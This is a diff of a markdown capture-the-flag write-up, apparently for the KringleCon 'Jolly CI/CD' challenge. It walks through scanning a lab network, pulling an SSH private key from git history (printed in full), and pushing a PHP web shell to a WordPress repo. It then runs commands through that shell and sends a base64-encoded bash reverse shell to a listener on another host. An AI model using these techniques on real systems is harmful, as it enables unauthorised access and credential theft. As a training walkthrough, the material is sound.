@@ -53,7 +53,12 @@ However, the following things are currently obvious:
 
 Apparently, this ISN'T the host I'm supposed to exploit! This is just one host on a network to exploit. Let's get to it then.
 
-using `nmap -sP 172.18.0.0/16` I discovered the following hosts up:
+using
+
+!!! abstract ""
+    nmap -sP 172.18.0.0/16
+
+I discovered the following hosts up:
 
 ```
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 17:49 GMT
@@ -174,13 +179,21 @@ Nmap done: 256 IP addresses (5 hosts up) scanned in 5.77 seconds
 After reading Tinsel Upatree's statement I discovered a git repo...which honestly was kinda lame that I had to rely on him to tell me this.
 
 I ran:
-`git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`
+
+!!! abstract ""
+    `#!sh git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`
+
 
 And it cloned the entire repository.
 
-I ran `git log` to find some interesting stuff...
+I ran 
 
-```
+!!! abstract ""
+    `#!sh git log`
+
+to find some interesting stuff...
+
+``` hl_lines="29 30 31 32 33"
 Date:   Wed Oct 26 13:58:15 2022 -0700
 
     updated wp-config
@@ -230,13 +243,13 @@ Date:   Mon Oct 24 17:32:07 2022 -0700
 
 That "whoops" is interesting. Let's get a diff between that and the one before it to find out what made him redact something:
 
-```
-git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5 abdea0ebb21b156c01f7533cea3b895c26198c98
-```
+!!! abstract ""
+    `#!sh git diff e19f653bde9ea3de6af21a587e41e7a909db1ca5 abdea0ebb21b156c01f7533cea3b895c26198c98`
+
 
 And it returned:
 
-```
+``` hl_lines="7 8 9 10 11 12 13 20"
 diff --git a/.ssh/.deploy b/.ssh/.deploy
 new file mode 100644
 index 0000000..3f7a9e3
@@ -261,17 +274,17 @@ index 0000000..8c0b43c
 
 Got a private key. Cool. I can do some fancy linux stuff but I'll just do it here:
 
-```
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
-QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
-9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
-AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
-PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
------END OPENSSH PRIVATE KEY-----
+!!! note "Private Key"
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+    QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
+    9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
+    AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
+    PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
+    -----END OPENSSH PRIVATE KEY-----
 
-user is `sporx`
-```
+    user is `sporx`
+
 
 With the new key, I can clone the repository using the following
 
@@ -294,47 +307,47 @@ Identity added: ./sporx.key (sporx@kringlecon.com)
 
 Now by adding the ssh key, I can clone (and presumably do bad things)
 
-```sh
-git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
-```
+!!! abstract ""
+    `#!sh git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`
+
 
 Let's modify one of the PHP files to have a comment that I can grep out.
 
-```
-grinchum-land:~/wordpress.flag.net.internal$ vi index.php 
-grinchum-land:~/wordpress.flag.net.internal$ git add index.php 
-grinchum-land:~/wordpress.flag.net.internal$ git commit -m "tee hee"
-Author identity unknown
+!!! abstract ""
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh vi index.php`
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git add index.php `
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git commit -m "tee hee"`
+    Author identity unknown
 
-*** Please tell me who you are.
+    *** Please tell me who you are.
 
-Run
+    Run
 
-  git config --global user.email "you@example.com"
-  git config --global user.name "Your Name"
+      git config --global user.email "you@example.com"
+      git config --global user.name "Your Name"
 
-to set your account's default identity.
-Omit --global to set the identity only in this repository.
+    to set your account's default identity.
+    Omit --global to set the identity only in this repository.
 
-fatal: empty ident name (for <samways@grinchum-land.flag.net.internal>) not allowed
-grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "totally-an-orc@kringlecon.com"
-grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "orcy"
-```
+    fatal: empty ident name (for <samways@grinchum-land.flag.net.internal>) not allowed
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git config --global user.email "totally-an-orc@kringlecon.com"`
+    
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh git config --global user.name "orcy"`
+
 
 And the addition I made to index.php?
 
-```php
-echo("<!-- agr0 -->");
-```
+!!! abstract ""
+    `#!php echo("<!-- agr0 -->");`
 
 Then, I committed and pushed.
 
 Then ran a curl on the site and grepped for my tag...
 
-```
-grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88 | grep agr0
-<!-- agr0 -->
-```
+!!! abstract ""
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -s http://172.18.0.88 | grep agr0`
+
+    `<!-- agr0 -->`
 
 Nice. Let's get a little interactive shell.
 
@@ -350,24 +363,22 @@ Then added it, committed it, and pushed it.
 
 Look at me. Look at me. I am the www-data now.
 
-```
-grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88/xmas.php?agr0=id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+!!! abstract ""
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -s http://172.18.0.88/xmas.php?agr0=id`
+    `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 
 Confirmed I can use post vars, which is easier than GET vars:
 
-```
-grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=id" http://172.18.0.88/xmas.php
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+!!! abstract ""
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -sd "agr0=id" http://172.18.0.88/xmas.php`
+    `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
 
 So do we have bash?
 
-```
-grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=which bash" http://172.18.0.88/xmas.php
-/bin/bash
-```
+!!! abstract ""
+    grinchum-land:~/wordpress.flag.net.internal$ `#!sh curl -sd "agr0=which bash" http://172.18.0.88/xmas.php`
+    `/bin/bash`
+
 
 So can we kick back a shell?
 
@@ -377,7 +388,7 @@ yup
 curl -sd 'agr0=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ== | base64 -d | bash' http://172.18.0.88/xmas.php
 ```
 
-Listening with `nc -lvnp 9090`
+Listening with `#!sh nc -lvnp 9090`
 
 The wordpress credentials are in the environment.
 
@@ -418,8 +429,8 @@ OLDPWD=/var/www
 
 Oh but I seem to have found a flag...
 
-`/home/flag.txt
+`/home/flag.txt`
 
-![The Flag](/img/elfhouse/jollycicd.png)`
+![The Flag](/img/elfhouse/jollycicd.png)
 
 `oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT`
